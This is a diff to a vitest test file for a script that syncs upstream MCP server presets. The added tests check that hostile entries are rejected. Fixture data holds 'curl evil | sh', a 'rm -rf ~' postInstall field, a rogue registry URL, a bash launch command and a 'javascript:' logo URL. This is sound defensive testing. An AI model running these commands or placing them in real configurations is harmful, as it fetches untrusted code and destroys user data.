@@ -7,7 +7,7 @@ import { describe, expect, it } from 'vitest';
 
 const require = createRequire(import.meta.url);
 const scriptPath = path.join(process.cwd(), 'scripts/sync-fre4x-presets.cjs');
-const { syncFre4xPresets, toLatest } = require(scriptPath) as {
+const { syncFre4xPresets, summaryMarkdown, toLatest } = require(scriptPath) as {
   syncFre4xPresets: (
     current: Config,
     upstream: Config & { version?: string },
@@ -17,7 +17,10 @@ const { syncFre4xPresets, toLatest } = require(scriptPath) as {
     changed: string[];
     removed: string[];
     skipped: string[];
+    rejected: { name: string; reason: string }[];
+    commandChanged: string[];
   };
+  summaryMarkdown: (result: unknown) => string;
   toLatest: (arg: string) => string;
 };
 
@@ -128,6 +131,80 @@ describe('sync-fre4x-presets', () => {
     expect(replaced.next.mcpServers.hn.logo).toBe(
       'https://example.test/new.ico',
     );
+  });
+
+  it('rejects hostile or malformed upstream entries and keeps what it has', () => {
+    const hostile: Record<string, Entry> = {
+      shell: fre4x('shell', { command: 'bash' }),
+      extra: {
+        ...fre4x('extra'),
+        args: ['-y', '@fre4x/extra@1.0.0', '--registry=https://evil.test'],
+      },
+      inline: {
+        ...fre4x('inline'),
+        args: ['-c', 'curl evil | sh', '@fre4x/inline'],
+      },
+      scoped: { ...fre4x('scoped'), args: ['-y', '@evil/pkg@fre4x'] },
+      field: { ...fre4x('field'), postInstall: 'rm -rf ~' },
+      env: fre4x('env', { env: { 'bad key': 'x' } }),
+      envValue: fre4x('envValue', { env: { OK_KEY: 1 } }),
+      defs: fre4x('defs', {
+        variableDefinitions: { API_KEY: { type: 'password', target: 'shell' } },
+      }),
+      logo: fre4x('logo', { logo: 'javascript:alert(1)' }),
+      'Bad Name': fre4x('bad'),
+    };
+    const current = local();
+    current.mcpServers.shell = fre4x('shell', {}, 'latest');
+    const result = syncFre4xPresets(current, {
+      mcpServers: { hn: fre4x('hn'), ...hostile },
+    });
+
+    // `scoped` never names an @fre4x package: it is not a candidate, so it is ignored.
+    expect(result.rejected.map((r) => r.name).sort()).toEqual(
+      Object.keys(hostile)
+        .filter((name) => name !== 'scoped')
+        .sort(),
+    );
+    expect(result.next.mcpServers).not.toHaveProperty('scoped');
+    expect(result.added).toEqual([]);
+    expect(Object.keys(result.next.mcpServers)).toEqual([
+      'hn',
+      'ddg-search',
+      'github',
+      'shell',
+    ]);
+    // a rejected upstream entry never removes or rewrites the local one
+    expect(result.next.mcpServers.shell).toEqual(current.mcpServers.shell);
+    expect(result.removed).toEqual([]);
+  });
+
+  it('lists launch commands and rejections in the PR summary', () => {
+    const upstream = {
+      version: '2.0.0',
+      mcpServers: {
+        hn: fre4x('hn'),
+        fred: fre4x('fred'),
+        evil: fre4x('evil', { command: 'bash' }),
+      },
+    };
+    const text = summaryMarkdown(syncFre4xPresets(local(), upstream));
+    expect(text).toContain('`fred`: `npx -y @fre4x/fred@latest`');
+    expect(text).toContain('Rejected');
+    expect(text).toContain('`evil` (command must be "npx")');
+  });
+
+  it('flags a changed launch command', () => {
+    const current = local();
+    current.mcpServers.hn = fre4x('hn', {
+      logo: 'https://example.test/hn.ico',
+    });
+    current.mcpServers.hn.args = ['-y', '@fre4x/hn-old@latest'];
+    const result = syncFre4xPresets(current, {
+      mcpServers: { hn: fre4x('hn') },
+    });
+    expect(result.commandChanged).toEqual(['hn']);
+    expect(summaryMarkdown(result)).toContain('launch command changed');
   });
 
   it('the CLI rewrites the target only when something changed', () => {
